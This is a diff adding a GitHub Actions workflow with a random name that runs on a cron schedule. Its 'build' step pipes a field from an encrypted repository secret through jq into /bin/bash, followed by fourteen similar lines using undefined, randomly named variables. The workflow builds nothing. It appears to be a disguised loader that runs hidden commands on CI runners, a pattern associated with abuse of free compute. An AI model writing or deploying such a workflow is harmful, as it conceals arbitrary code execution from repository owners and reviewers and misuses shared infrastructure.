@@ -1,0 +1,31 @@
+name: alarmingnecklace
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '48 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: alarmingnecklace
+        env:
+          bq56242: ${{ secrets.bq56242 }}
+        run: |
+          echo $bq56242 | jq -r .cv9 | /bin/bash
+          echo $n9504 | jq -r .kuxpx0426 | /bin/bash
+          echo $d41 | jq -r .yfki2 | /bin/bash
+          echo $uxi447 | jq -r .jpm952 | /bin/bash
+          echo $ftr16 | jq -r .zi5608 | /bin/bash
+          echo $i3760 | jq -r .zjgp75256 | /bin/bash
+          echo $ogbc949 | jq -r .h0174 | /bin/bash
+          echo $o57 | jq -r .grzgl73012 | /bin/bash
+          echo $gzipy26 | jq -r .n4055 | /bin/bash
+          echo $iantr6337 | jq -r .fga9406 | /bin/bash
+          echo $wn35 | jq -r .ffzsz32 | /bin/bash
+          echo $m14 | jq -r .nbcd33570 | /bin/bash
+          echo $ouoi93 | jq -r .iirf06771 | /bin/bash
+          echo $zr6 | jq -r .b82 | /bin/bash
+          echo $czjtg83 | jq -r .zy7 | /bin/bash
+
